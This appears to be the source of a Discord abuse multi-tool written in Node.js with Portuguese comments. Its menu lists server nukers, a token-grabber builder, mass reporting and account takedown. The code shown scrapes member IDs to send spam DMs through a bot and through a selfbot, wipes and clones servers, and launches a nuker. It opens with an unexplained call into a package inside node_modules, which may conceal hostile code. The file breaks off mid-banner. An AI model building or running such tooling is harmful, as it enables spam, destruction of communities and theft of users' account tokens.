const checker_size = require('./node_modules/flame-vali/checker_size/checker')
checker_size("valid")

Gradient = require("gradient-string")
const Shell = require("shelljs");

tokenchecker = `
      

██╗   ██╗███████╗██████╗ ██╗███████╗██╗ ██████╗ █████╗ ███╗   ██╗██████╗  ██████╗ 
██║   ██║██╔════╝██╔══██╗██║██╔════╝██║██╔════╝██╔══██╗████╗  ██║██╔══██╗██╔═══██╗
██║   ██║█████╗  ██████╔╝██║█████╗  ██║██║     ███████║██╔██╗ ██║██║  ██║██║   ██║
╚██╗ ██╔╝██╔══╝  ██╔══██╗██║██╔══╝  ██║██║     ██╔══██║██║╚██╗██║██║  ██║██║   ██║
 ╚████╔╝ ███████╗██║  ██║██║██║     ██║╚██████╗██║  ██║██║ ╚████║██████╔╝╚██████╔╝
  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ 
                                                                                  
████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗                                      
╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║                                      
   ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║                                      
   ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║                                      
   ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║                                      
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝                                      
                                                                                  
                                                                                                                 
`;

/** Importante */

const {
    Client
} = require("discord.js-selfbot-v11")
    , fronha = new Client();
discord = require("discord.js");

const title = require('proc-title')
title('By PolarLofy | https://discord.gg/vByHaKmQ')



/** Const */

const {
    red
    , yellow
    , greenBright
    , yellowBright
    , magenta
} = require("chalk");
const readline = require("readline")
    .createInterface({
        input: process.stdin
        , output: process.stdout
    });
const request = require("request");
const {
    prompt
} = require("enquirer");
const fs = require("fs");
const msgDm = fs.readFileSync("Arquivos Config/mensagem.txt")
    .toString();
const message = fs.readFileSync("./Arquivos Config/mensagem.txt")
    .toString();
const a = {};
const {
    token_bot
    , token_conta
    , tempo
    , sleep
    , gatilho
} = require("./Arquivos Config/config.json");

/** Var */

const colors = require("colors")
const Discord = require('discord.js-selfbot-v11');

/**  process on */

process.on("uncaughtException", e => console.log(e));
process.on("unhandledRejection", e => console.log(e));
process.on("unhandledRejection", a => {});



console.clear();

console.log(Gradient.retro(`



                 ██╗      ██████╗ ███████╗██╗   ██╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
                 ██║     ██╔═══██╗██╔════╝╚██╗ ██╔╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
                 ██║     ██║   ██║█████╗   ╚████╔╝    ██║   ██║   ██║██║   ██║██║     ███████╗
                 ██║     ██║   ██║██╔══╝    ╚██╔╝     ██║   ██║   ██║██║   ██║██║     ╚════██║
                 ███████╗╚██████╔╝██║        ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
                 ╚══════╝ ╚═════╝ ╚═╝        ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝



`));

// Opções + em breve

var Q1 = "[01] Bot de divulgação [Bot]"
var Q2 = "[02] Divulgação por uma conta [Conta]"
var Q3 = "[03] Limpador de mensagem [Conta]"
var Q4 = "[04] Clonar um servidor [Conta]"
var Q5 = "[05] Nuker [Conta]"
var Q6 = "[06] Nuker [Bot]"
var Q7 = "[07] Token Checker"
var Q0 = "[0] Sair "

var Q8 = "[08] Webhook spawn [Requer Python]"
var Q9 = "[09] Webhook delete [Requer Python]"
var Q10 = "[10] Criar um Token Grabber (PY) [Requer Python]"
var Q11 = "[11] Denúncias em massa (discord.gg) [Requer Python]"
var Q12 = "[12] Derrubar uma conta [Requer Python]"
var Q13 = "[13] Consulta CPF [OFF]"
var Q14 = "[14] Consulta CPNJ"
var Q15 = "[15] Criar um Token Grabber (JS) [Requer Python]"


Main();

function Main() {
    console.log(
        `
         ${Q1}               |         ${Q8}
         ${Q2}      |         ${Q9}
         ${Q3}          |         ${Q10}
         ${Q4}            |         ${Q11}
         ${Q5}                         |         ${Q12}
         ${Q6}                           |         ${Q13}
         ${Q7}                         |         ${Q14}
         ${Q0}                                  |         ${Q15}

                                                             ${("[!] Atualizado no dia 03/02/2022".green)}
                                                             ${("[C] Criado por PolarLofy".green)}
         `.yellow
    );
    
    readline.question("         [?] Escolha a opção: ".yellow, answer => {
        switch (answer) {
            
            
        case "4":
            console.clear();
            
            
            
            async function corrida() {
                await Logclean();
                
                const config = await prompt([
                    {
                        type: "input"
                        , name: "token"
                        , message: "     Insira o token da sua conta"
            }
                    , {
                        type: "input"
                        , name: "original"
                        , message: "     Insira o ID do servidor para copiar"
            }
                    , {
                        type: "input"
                        , name: "target"
                        , message: "     Insira o ID do servidor para colar"
            }
          ]);
                const {
                    token
                    , original
                    , target
                } = config;
                
                fronha.on("ready", async () => {
                    Logclean();
                    const guilds = [
              await fronha.guilds.get(original)
              , await fronha.guilds.get(target)
            ];
                    guilds.forEach(g => {
                        if (!g) {
                            log("     Servidor desconhecido, verifique o ID!",
                                3);
                            process.exit(1);
                        }
                    });
                    
                    let itens = {
                        text: guilds[0].channels
                            .filter(c => c.type === "text")
                            .sort((a, b) => a.calculatedPosition - b
                                .calculatedPosition)
                            .map(c => c)
                        , voice: guilds[0].channels
                            .filter(c => c.type === "voice")
                            .sort((a, b) => a.calculatedPosition - b
                                .calculatedPosition)
                            .map(c => c)
                        , category: guilds[0].channels
                            .filter(c => c.type === "category")
                            .sort((a, b) => a.calculatedPosition - b
                                .calculatedPosition)
                            .map(c => c)
                        , roles: guilds[0].roles
                            .sort((a, b) => b.calculatedPosition - a
                                .calculatedPosition)
                            .map(r => r)
                    };
                    
                    log("     Excluindo todos os canais e funções do servidor ...",
                    1);
                    await guilds[1].channels.forEach(c => c.delete()
                        .catch(() => {}));
                    await guilds[1].roles.map(r => r.delete()
                        .catch(() => {}));
                    
                    await guilds[1].setIcon(guilds[0].iconURL);
                    await guilds[1].setName(`${guilds[0].name}`);
                    
                    for (let role of itens.roles) {
                        if (guilds[1].roles.get(role.id)) continue;
                        
                        guilds[1]
                            .createRole({
                                name: role.name
                                , type: role.type
                                , color: role.color
                                , permissions: role.permissions
                                , managed: role.managed
                                , mentionable: role.mentionable
                                , position: role.position
                            })
                            .then(r => log(`     Cargo criado: ${r.name}`, 1));
                    }
                    
                    await guilds[0].emojis.forEach(e => {
                        if (guilds[1].emojis.get(e.id)) return;
                        
                        guilds[1]
                            .createEmoji(e.url, e.name)
                            .then(c => log(`     Criado Emoji: ${c}`, 1));
                    });
                    
                    itens["category"].forEach(async category => {
                        if (guilds[1].channels.get(category.id)) return;
                        
                        await guilds[1]
                            .createChannel(category.name, {
                                type: "category"
                                , permissionOverwrites: category
                                    .permissionOverwrites
                                    .map(v => {
                                        let target = guilds[0]
                                            .roles.get(v.id);
                                        if (!target) return;
                                        return {
                                            id: guilds[1].roles
                                                .find(r => r
                                                    .name ==
                                                    target.name
                                                    ) ||
                                                guilds[1].id
                                            , allow: v.allow || 0
                                            , deny: v.deny || 0
                                        };
                                    })
                                    .filter(v => v)
                                , position: category.position
                            })
                            .then(c => {
                                log(`     Criado categoria: ${c.name}`,
                                    1);
                            });
                    });
                    
                    for (let channel of itens.text) {
                        if (guilds[1].channels.get(channel.id)) continue;
                        
                        if (!channel.parent) {
                            if (channel.topic)
                                await guilds[1]
                                .createChannel(channel.name, {
                                    type: "text"
                                    , permissionOverwrites: channel
                                        .permissionOverwrites
                                        .map(v => {
                                            let target = guilds[0].roles.get(v
                                                .id);
                                            if (!target) return;
                                            return {
                                                id: guilds[1].roles.find(
                                                    r => r.name == target
                                                    .name
                                                ) || guilds[1].id
                                                , allow: v.allow || 0
                                                , deny: v.deny || 0
                                            };
                                        })
                                        .filter(v => v)
                                    , position: channel.position
                                })
                                .then(c => c.setTopic(channel.topic));
                        } else {
                            let chn = await guilds[1].createChannel(channel.name, {
                                type: "text"
                                , permissionOverwrites: channel
                                    .permissionOverwrites
                                    .map(v => {
                                        let target = guilds[0].roles.get(v
                                            .id);
                                        if (!target) return;
                                        return {
                                            id: guilds[1].roles.find(r =>
                                                    r.name == target.name
                                                    ) ||
                                                guilds[1].id
                                            , allow: v.allow || 0
                                            , deny: v.deny || 0
                                        };
                                    })
                                    .filter(v => v)
                                , position: channel.position
                            });
                            if (channel.topic) chn.setTopic(channel.topic);
                            
                            if (guilds[1].channels.find(c => c.name == channel.parent
                                    .name))
                                chn.setParent(
                                    guilds[1].channels.find(c => c.name == channel
                                        .parent.name)
                                    .id
                                );
                            else {
                                var cat = await guilds[1].createChannel(channel.parent
                                    .name, {
                                        type: "category"
                                        , permissionOverwrites: channel
                                            .permissionOverwrites
                                            .map(v => {
                                                let target = guilds[0].roles
                                                    .get(v.id);
                                                if (!target) return;
                                                return {
                                                    id: guilds[1].roles.find(
                                                            r => r.name ==
                                                            target.name) ||
                                                        guilds[1].id
                                                    , allow: v.allow || 0
                                                    , deny: v.deny || 0
                                                };
                                            })
                                            .filter(v => v)
                                        , position: channel.position
                                    });
                                chn.setParent(cat);
                            }
                        }
                        log(`     Canal criado: ${channel.name}`, 1);
                    }
                    
                    for (let channel of itens.voice) {
                        if (guilds[1].channels.get(channel.id)) continue;
                        
                        if (!channel.parent) {
                            if (channel.topic)
                                await guilds[1].createChannel(channel.name, {
                                    type: "voice"
                                    , permissionOverwrites: channel
                                        .permissionOverwrites
                                        .map(v => {
                                            let target = guilds[0].roles.get(v
                                                .id);
                                            if (!target) return;
                                            return {
                                                id: guilds[1].roles.find(r =>
                                                        r.name == target.name
                                                        ) ||
                                                    guilds[1].id
                                                , allow: v.allow || 0
                                                , deny: v.deny || 0
                                            };
                                        })
                                        .filter(v => v)
                                    , position: channel.position
                                    , userLimit: channel.userLimit
                                });
                        } else {
                            let chn = await guilds[1].createChannel(channel.name, {
                                type: "voice"
                                , permissionOverwrites: channel
                                    .permissionOverwrites
                                    .map(v => {
                                        let target = guilds[0].roles.get(v
                                            .id);
                                        if (!target) return;
                                        return {
                                            id: guilds[1].roles.find(r =>
                                                    r.name == target.name
                                                    ) ||
                                                guilds[1].id
                                            , allow: v.allow || 0
                                            , deny: v.deny || 0
                                        };
                                    })
                                    .filter(v => v)
                                , position: channel.position
                                , userLimit: channel.userLimit
                            });
                            
                            if (guilds[1].channels.find(c => c.name == channel.parent
                                    .name))
                                chn.setParent(
                                    guilds[1].channels.find(c => c.name == channel
                                        .parent.name)
                                    .id
                                );
                            else {
                                var cat = await guilds[1].createChannel(channel.parent
                                    .name, {
                                        type: "category"
                                        , permissionOverwrites: channel
                                            .permissionOverwrites
                                            .map(v => {
                                                let target = guilds[0].roles
                                                    .get(v.id);
                                                if (!target) return;
                                                return {
                                                    id: guilds[1].roles.find(
                                                            r => r.name ==
                                                            target.name) ||
                                                        guilds[1].id
                                                    , allow: v.allow || 0
                                                    , deny: v.deny || 0
                                                };
                                            })
                                            .filter(v => v)
                                        , position: channel.position
                                    });
                                chn.setParent(cat);
                            }
                        }
                        log(`     Canal criado: ${channel.name}`, 1);
                    }
                });
                
                fronha.login(`${token}`.replace(/"/g, ""))
                    .catch(() => {
                        Logclean();
                        log("     Ops! Algo está errado, verifique o token!", 3);
                    });
            }
            
            async function Logclean() {
                console.clear();
                console.log(
                    `
     
                 
            ▄████▄   ██▓     ▒█████   ███▄    █ ▓█████  ██▀███  
            ▒██▀ ▀█  ▓██▒    ▒██▒  ██▒ ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
            ▒▓█    ▄ ▒██░    ▒██░  ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
            ▒▓▓▄ ▄██▒▒██░    ▒██   ██░▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  
            ▒ ▓███▀ ░░██████▒░ ████▓▒░▒██░   ▓██░░▒████▒░██▓ ▒██▒
            ░ ░▒ ▒  ░░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
            ░  ▒   ░ ░ ▒  ░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
            ░          ░ ░   ░ ░ ░ ▒     ░   ░ ░    ░     ░░   ░ 
            ░ ░          ░  ░    ░ ░           ░    ░  ░   ░     
            ░                                                    
 
          /Clonar um servidor

            `.brightMagenta
                );
            }
            
            async function log(message, type) {
                switch (type) {
                case 1:
                    await console.log(`     [✓] ${message}`.brightGreen);
                    break;
                case 2:
                    await console.log(`     [⚠] ${message}`.yellow);
                    break;
                case 3:
                    await console.log(`     [❌] ${message}`.red);
                    break;
                }
            }
            corrida();
            
            break;
            
        case "1":
            const MessageAttachment = require("discord.js");
            const polar = new MessageAttachment.Client();
            
            
            console.log(``);
            
            Main();
            
            function Main() {
                console.clear();
                console.log(
                    `
        
        

        ▄▄▄▄·       ▄▄▄▄▄    ·▄▄▄▄  ▄▄▄ .    ·▄▄▄▄  ▪   ▌ ▐·▄• ▄▌▄▄▌   ▄▄ •  ▄▄▄·       
        ▐█ ▀█▪▪     •██      ██▪ ██ ▀▄.▀·    ██▪ ██ ██ ▪█·█▌█▪██▌██•  ▐█ ▀ ▪▐█ ▀█ ▪     
        ▐█▀▀█▄ ▄█▀▄  ▐█.▪    ▐█· ▐█▌▐▀▀▪▄    ▐█· ▐█▌▐█·▐█▐█•█▌▐█▌██▪  ▄█ ▀█▄▄█▀▀█  ▄█▀▄ 
        ██▄▪▐█▐█▌.▐▌ ▐█▌·    ██. ██ ▐█▄▄▌    ██. ██ ▐█▌ ███ ▐█▄█▌▐█▌▐▌▐█▄▪▐█▐█ ▪▐▌▐█▌.▐▌
        ·▀▀▀▀  ▀█▄▀▪ ▀▀▀     ▀▀▀▀▀•  ▀▀▀     ▀▀▀▀▀• ▀▀▀. ▀   ▀▀▀ .▀▀▀ ·▀▀▀▀  ▀  ▀  ▀█▄▀▪
        
        /Bot de divulgação

        
        `.magenta
                );
                
                console.log("     [1] Modo Normal\n     [2] Modo com delay\n".yellow);
                readline.question("     > Escolha a opção: ".magenta, answer => {
                    switch (answer) {
                    case "1":
                        readline.question(
                            "     > ID do servidor: ".magenta
                            , response => {
                                console.log("");
                                ScrapeUsers(response)
                                    .then(() => {
                                        console.log("     > Carregando dados".green);
                                        setTimeout(() => {
                                            MassDMNormal(null, message)
                                                .catch(err => {
                                                    console.log(err);
                                                    setTimeout(() => {
                                                        console
                                                            .log(
                                                                "     > Aviso: reiniciando."
                                                                .yellow
                                                                );
                                                    }, 1000);
                                                    setTimeout(() => {
                                                        process
                                                            .exit(
                                                                1
                                                                );
                                                    }, 2000);
                                                });
                                        }, 2000);
                                    });
                            }
                        );
                        break;
                    case "2":
                        readline.question("     > ID do servidor: ".blue, response => {
                            ScrapeUsers(response)
                                .then(() => {
                                    setTimeout(() => {
                                        readline.question(
                                            "\n     > Defina o número de segundos que o bot espera\n     Antes de enviar mensagens aos usuários.\n     [i] Limite(s): 3 - 9 segundos\n\n            [!] Digite o limite: "
                                            .yellow
                                            , timeout => {
                                                if (
                                                    timeout === "3" ||
                                                    timeout === "4" ||
                                                    timeout === "5" ||
                                                    timeout === "6" ||
                                                    timeout === "7" ||
                                                    timeout === "8" ||
                                                    timeout === "9"
                                                ) {
                                                    const timer =
                                                        parseInt(
                                                            timeout) *
                                                        1000;
                                                    console.log(
                                                        "     > Carregando dados"
                                                        .green);
                                                    MassDMTimeOut(
                                                            null,
                                                            timer,
                                                            message)
                                                        .catch(
                                                        err => {
                                                            console
                                                                .log(
                                                                    err
                                                                    );
                                                            setTimeout
                                                                (() => {
                                                                        console
                                                                            .log(
                                                                                "     > Aviso Reiniciando."
                                                                                .yellow
                                                                                );
                                                                    },
                                                                    1000
                                                                    );
                                                            setTimeout
                                                                (() => {
                                                                        process
                                                                            .exit(
                                                                                1
                                                                                );
                                                                    },
                                                                    2000
                                                                    );
                                                        });
                                                } else {
                                                    console.log(
                                                        red("     > Um numero invalido foi usado"
                                                            .red)
                                                    );
                                                    setTimeout(() => {
                                                        console
                                                            .log(
                                                                "     > Aviso Reiniciando."
                                                                .yellow
                                                                );
                                                    }, 1000);
                                                    setTimeout(() => {
                                                        process
                                                            .exit(
                                                                1
                                                                );
                                                    }, 2000);
                                                }
                                            }
                                        );
                                    }, 2000);
                                });
                        });
                        break;
                    default:
                        console.log(red("     > Uma opção errada foi usada".red));
                    }
                });
            }
            
            async function ScrapeUsers(guildID) {
                polar.guilds
                    .fetch(guildID)
                    .then(guild => {
                        const file_path = "./Arquivos Logs/ids.json";
                        const MemberIDs = guild.members.cache.map(users => users.id);
                        console.log(
                            "     [!] " +
                            MemberIDs.length +
                            "     > ID de usuários anotados".yellow
                        );
                        const Data = {
                            IDs: MemberIDs
                        };
                        const content = JSON.stringify(Data, null, 2);
                        fs.writeFileSync(file_path, content, err => {
                            if (err)
                                return console.log(
                                    "     > Erro ao gravar o arquivo: ".red + err
                                );
                            console.log(
                                "     > Arquivo gravado com sucesso ".red +
                                file_path
                            );
                        });
                    })
                    .catch(err => {
                        console.log(`     > Id do servidor esta invalido`.red);
                        setTimeout(() => {
                            console.log("     > Aviso Reiniciando.".yellow);
                        }, 1000);
                        setTimeout(() => {
                            process.exit(1);
                        }, 2000);
                    });
            }
            
            function MassDMTimeOut(users, timeout, msg) {
                return new Promise((resolve, reject) => {
                    const scraped = require("./Arquivos Logs/ids.json");
                    users = scraped.IDs;
                    if (typeof timeout != "number") {
                        reject("     > Erro de tempo limite: dados incorreto usado.".red);
                    } else if (typeof msg != "string") {
                        reject(
                            "     > Erro de Args da mensagem: Deve-se usar o tipo de dados 'string'"
                            .red
                        );
                    } else {
                        for (let i = 0; i <= users.length; i++) {
                            polar.users
                                .fetch(users[i])
                                .then(u => {
                                    (function (i) {
                                        setTimeout(function () {
                                            u.send(msg)
                                                .then(() =>
                                                    console.log(
                                                        "     > Mensagem enviada para: "
                                                        .green +
                                                        u.tag.yellow
                                                    )
                                                )
                                                .catch(err =>
                                                    console.log(
                                                        "     > Erro ao enviar mensagem para: "
                                                        .red +
                                                        u.tag.yellow
                                                    )
                                                );
                                        }, timeout * i);
                                    })(i);
                                })
                                .catch(err =>
                                    console.log(
                                        `     > Verificando problemas no bot.\n     Erro encontrado: ${err}\n`
                                        .red
                                    )
                                );
                        }
                        resolve();
                    }
                });
            }

/**
 * 
 * @param {array} users
 * @param {string} msg
 * 
 */
            
            function MassDMNormal(users, msg) {
                return new Promise((resolve, reject) => {
                    const scraped = require("./Arquivos Logs/ids.json");
                    users = scraped.IDs;
                    for (let i = 0; i <= users.length; i++) {
                        polar.users
                            .fetch(users[i])
                            .then(u => {
                                u.send(msg)
                                    .then(() =>
                                        console.log(
                                            "     > Mensagem enviada para: ".green + u.tag
                                            .yellow
                                        )
                                    )
                                    .catch(err =>
                                        console.log(
                                            "     > Erro ao enviar mensagem para: ".red +
                                            u.tag.yellow
                                        )
                                    );
                            })
                            .catch(err =>
                                console.log(
                                    `     > Verificando problemas no bot.\n     Erro encontrado: ${err}\n`
                                )
                            );
                    }
                    resolve();
                });
            }
            
            polar.login(token_bot)
                .catch(err => {
                    console.clear();
                    process.title = `Erro | Token Invalido`;
                    console.log(
                        `
        ${tokenchecker}
        `.magenta
                    );
                    console.log(
                        `     UM token invalido foi usado\n     mude-o e não esqueça de ativar as opções no painel do bot\n     Motivo Real: ${err}`
                        .yellow
                    );
                    process.exit();
                });
            
            break;
            
        case "2":
            
            
            console.clear()
            
            console.log(`

        
   ▓█████▄  ██▓ ██▒   █▓   ▓█████  ███▄ ▄███▓    ▄████▄   ▒█████   ███▄    █ ▄▄▄█████▓ ▄▄▄      
   ▒██▀ ██▌▓██▒▓██░   █▒   ▓█   ▀ ▓██▒▀█▀ ██▒   ▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █ ▓  ██▒ ▓▒▒████▄    
   ░██   █▌▒██▒ ▓██  █▒░   ▒███   ▓██    ▓██░   ▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒▒ ▓██░ ▒░▒██  ▀█▄  
   ░▓█▄   ▌░██░  ▒██ █░░   ▒▓█  ▄ ▒██    ▒██    ▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒░ ▓██▓ ░ ░██▄▄▄▄██ 
   ░▒████▓ ░██░   ▒▀█░     ░▒████▒▒██▒   ░██▒   ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░  ▒██▒ ░  ▓█   ▓██▒
   ▒▒▓  ▒ ░▓     ░ ▐░     ░░ ▒░ ░░ ▒░   ░  ░   ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒   ▒ ░░    ▒▒   ▓▒█░
   ░ ▒  ▒  ▒ ░   ░ ░░      ░ ░  ░░  ░      ░     ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░    ░      ▒   ▒▒ ░
   ░ ░  ░  ▒ ░     ░░        ░   ░      ░      ░        ░ ░ ░ ▒     ░   ░ ░   ░        ░   ▒   
   ░     ░        ░        ░  ░       ░      ░ ░          ░ ░           ░                ░  ░
   ░               ░                           ░                                               

   /div em conta

`.magenta);
            console.log("")
            async function sleep(time) {
                return new Promise(resolve => setTimeout(resolve, time));
            }
            
            fronha.cachedUsers = [];
            async function run() {
                fronha.on("ready", async () => {
                    while (true) {
                        for (const guild of await fronha.guilds.array()) {
                            let members = guild.members
                                .filter(x => x.id !== fronha.user.id)
                                .map(m => m);
                            
                            if (!members) {
                                console.log(
                                    `     > Nenhum membro carregado em ${(guild.name)}
          \n     > Esperando para recarregar o cache e verificando o próximo servidor.`.yellow);
                                await sleep("4000");
                            }
                            
                            console.log(
                                `     > Enviando mensagem para ${guild.members.size} membros no servidor ${guild.name}`
                                .green);
                            
                            for (const member of members.values()) {
                                const already = fronha.cachedUsers.includes(member
                                .id);
                                if (already) {
                                    console.log(
                                        `     > O usuario ${member.user.tag} já recebeu uma mensagem`
                                        .white);
                                    continue;
                                }
                                
                                const response = await member.send(msgDm)
                                    .catch(err => {
                                        if (
                                            err.code == 500 ||
                                            err.mensagem ==
                                            "Request to use token, but token was unavailable to the client"
                                        ) {
                                            console.log(
                                                `     > O token da conta ${fronha.user.tag} caiu`
                                                .red);
                                            return process.exit();
                                        }
                                        return null;
                                    });
                                
                                if (!response) continue;
                                
                                console.log(
                                    `     > Mensagem enviada ao usuário ${(member.user.tag)} do servidor ${(guild.name)}`
                                    .green
                                );
                                fronha.cachedUsers.push(member.id);
                                await sleep(tempo * 1000);
                            }
                        }
                    }
                });
                
                fronha.login(token_conta)
                    .catch(err => {
                        console.log(`${tokenchecker}`);
                        console.log(`     > Um token invalido foi usado`.red);
                        console.log(`     > Motivo Real:  ${err}`.red);
                        process.exit();
                    });
            }
            run();
            
            break;
            
        case "3":
            console.clear();
            console.log(`
        
        
        ▄▄▌  ▪  • ▌ ▄ ·.  ▄▄▄· ▄▄▄· ·▄▄▄▄        ▄▄▄      ·▄▄▄▄  ▄▄▄ .    
        ██•  ██ ·██ ▐███▪▐█ ▄█▐█ ▀█ ██▪ ██ ▪     ▀▄ █·    ██▪ ██ ▀▄.▀·    
        ██▪  ▐█·▐█ ▌▐▌▐█· ██▀·▄█▀▀█ ▐█· ▐█▌ ▄█▀▄ ▐▀▀▄     ▐█· ▐█▌▐▀▀▪▄    
        ▐█▌▐▌▐█▌██ ██▌▐█▌▐█▪·•▐█ ▪▐▌██. ██ ▐█▌.▐▌▐█•█▌    ██. ██ ▐█▄▄▌    
        .▀▀▀ ▀▀▀▀▀  █▪▀▀▀.▀    ▀  ▀ ▀▀▀▀▀•  ▀█▄▀▪.▀  ▀    ▀▀▀▀▀•  ▀▀▀     
        • ▌ ▄ ·. ▄▄▄ . ▐ ▄ .▄▄ ·  ▄▄▄·  ▄▄ • ▄▄▄ .• ▌ ▄ ·.                
        ·██ ▐███▪▀▄.▀·•█▌▐█▐█ ▀. ▐█ ▀█ ▐█ ▀ ▪▀▄.▀··██ ▐███▪               
        ▐█ ▌▐▌▐█·▐▀▀▪▄▐█▐▐▌▄▀▀▀█▄▄█▀▀█ ▄█ ▀█▄▐▀▀▪▄▐█ ▌▐▌▐█·               
        ██ ██▌▐█▌▐█▄▄▌██▐█▌▐█▄▪▐█▐█ ▪▐▌▐█▄▪▐█▐█▄▄▌██ ██▌▐█▌               
        ▀▀  █▪▀▀▀ ▀▀▀ ▀▀ █▪ ▀▀▀▀  ▀  ▀ ·▀▀▀▀  ▀▀▀ ▀▀  █▪▀▀▀

        /limpador de mensagem
        
        `.magenta);
            
            function printClear() {
                console.log("");
                console.log(
                    `     > ${fronha.user.tag} | use: '${gatilho}' em qualquer chat. •`
                    .brightCyan
                );
            }
            
            function clear(authToken, authorId, channelId) {
                const wait = async ms => new Promise(done => setTimeout(done, ms));
                
                const headers = {
                    Authorization: authToken
                };
                
                const recurse = before => {
                    let params = before ? `?before=${before}` : ``;
                    
                    request({
                            url: `https://discord.com/api/v9/channels/${channelId}/messages${params}`
                            , headers: headers
                            , json: true
                        }
                        , async (error, response, result) => {
                            if (response === undefined) {
                                return recurse(before);
                            }
                            
                            if (response.statusCode === 202) {
                                const w = response.retry_after;
                                
                                console.log(
                                    `     > Ops, canal não indexado, aguarde ${w} ms para indexar as mensagens.`
                                    .red
                                );
                                
                                await wait(w);
                                
                                return recurse(before);
                            }
                            
                            if (response.statusCode !== 200) {
                                return console.log("     > Aguardando API!".blue, result);
                            }
                            
                            for (let i in result) {
                                let message = result[i];
                                
                                if (message.author.id === authorId && message.type !==
                                    3) {
                                    await new Promise(resolve => {
                                        const deleteRecurse = () => {
                                            request.delete({
                                                    url: `https://discord.com/api/v9/channels/${channelId}/messages/${message.id}`
                                                    , headers: headers
                                                    , json: true
                                                }
                                                , async (error, response,
                                                    result) => {
                                                    if (error) {
                                                        return deleteRecurse();
                                                    }
                                                    if (result) {
                                                        if (result
                                                            .retry_after !==
                                                            undefined
                                                            ) {
                                                            console
                                                                .log(
                                                                    `     > Rate-limited! Espere ${result.retry_after} ms para continuar a limpeza.`
                                                                );
                                                            await wait
                                                                (result
                                                                    .retry_after *
                                                                    1000
                                                                    );
                                                            return deleteRecurse();
                                                        }
                                                    }
                                                    
                                                    resolve();
                                                }
                                            );
                                        };
                                        
                                        deleteRecurse();
                                    });
                                }
                            }
                            
                            if (result.length === 0) {
                                printClear();
                                console.log(
                                    `     > Pronto!
                          `.magenta
                                );
                            } else {
                                recurse(result[result.length - 1].id);
                            }
                        }
                    );
                };
                
                recurse();
            }
            
            fronha.on("ready", async () => {
                printClear();
            });
            
            fronha.on("message", async message => {
                if (message.author.id != fronha.user.id) return;
                if (message.content.toLowerCase() === gatilho) {
                    message.delete();
                    clear(token_conta, fronha.user.id, message.channel.id);
                    console.log(
                        `     > Gatilho detectado - Iniciando o processo de limpeza ....`
                        .green
                    );
                }
            });
            
            fronha.on("warn", () => {});
            fronha.on("error", () => {});
            
            fronha.login(token_conta)
                .catch(err => {
                    console.log(
                        `
${tokenchecker}                                                                                                                            
            `
                    );
                    
                    console.log(`     > Um token invalido foi usado`.red);
                    console.log(`     > Motivo Real:  ${err}`.red);
                    process.exit();
                });
            
            break;
            
        case "5":
            
            console.clear();
            Shell.exec(`start node Api/"Nuker.js"`);
            process.exit(1);
            
            
            break;
            
            
        case "6":
            console.clear();
            
            const Discord = require("discord.js");
            const axios = require("axios")
                .default;
            const client = new Discord.Client({
                ws: {
                    intents: new Discord.Intents(Discord.Intents.ALL)
                }
            });
            const {
                red
                , green
                , yellow
                , greenBright
                , yellowBright
                , blueBright
            } = require("chalk");
            const lofy = require("./Arquivos Config/nuker_bot.json");
            const Everyone = lofy.Everyone;
            const nome_canal_mp = lofy.nome_canal_mp;
            const criar_cargos = lofy.criar_cargos;
            const emoji_menu = lofy.emoji_menu;
            const status_da_twitch = lofy.status_da_twitch;
            const criar_canais = lofy.criar_canais;
            const nome_do_servidor = lofy.nome_do_servidor;
            const marcação = lofy.marcação;
            const icone_do_servidor = lofy.icone_do_servidor;
            const status_bot = lofy.status_bot;
            const {
                question
            } = require("readline-sync");
            const colors = require("colors");
            console.log(
                `
                         

     ██████╗ ██████╗ ███╗   ██╗███████╗██╗ ██████╗         ██╗███████╗ ██████╗ ███╗   ██╗
     ██╔════╝██╔═══██╗████╗  ██║██╔════╝██║██╔════╝         ██║██╔════╝██╔═══██╗████╗  ██║
     ██║     ██║   ██║██╔██╗ ██║█████╗  ██║██║  ███╗        ██║███████╗██║   ██║██╔██╗ ██║
     ██║     ██║   ██║██║╚██╗██║██╔══╝  ██║██║   ██║   ██   ██║╚════██║██║   ██║██║╚██╗██║
     ╚██████╗╚██████╔╝██║ ╚████║██║     ██║╚██████╔╝██╗╚█████╔╝███████║╚██████╔╝██║ ╚████║
     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝     ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝
     By Polar Lofy                                                                                
                         
`.red
            );
            
            readline.question("     > Prefixo: ", prefix => {
                readline.question("     > id Do dono: ", myID => {
                    //const prefix = question("     > Prefixo: ".blue);
                    //const myID = question("     > id Do dono: ".blue);
                    
                    client.on("ready", () => {
                        console.clear();
                        console.log(
                            `
    
    
    ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███      ▄▄▄▄    ▒█████  ▄▄▄█████▓
    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒   ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒
